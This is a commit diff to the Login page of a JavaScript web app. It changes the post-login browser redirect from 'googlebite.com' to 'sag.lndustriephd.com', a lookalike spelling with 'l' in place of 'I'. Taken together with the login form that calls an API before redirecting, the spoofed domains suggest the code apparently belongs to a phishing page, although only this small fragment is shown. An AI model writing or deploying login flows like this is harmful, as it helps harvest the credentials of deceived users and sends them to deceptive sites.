415149c2c4580e180ecc25d157b2f54eb8e841ce
husknet <127146284+husknet@users.noreply.github.com>
2025-01-27 02:06:58 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://googlebite.com';
+      window.location.href = 'https://sag.lndustriephd.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
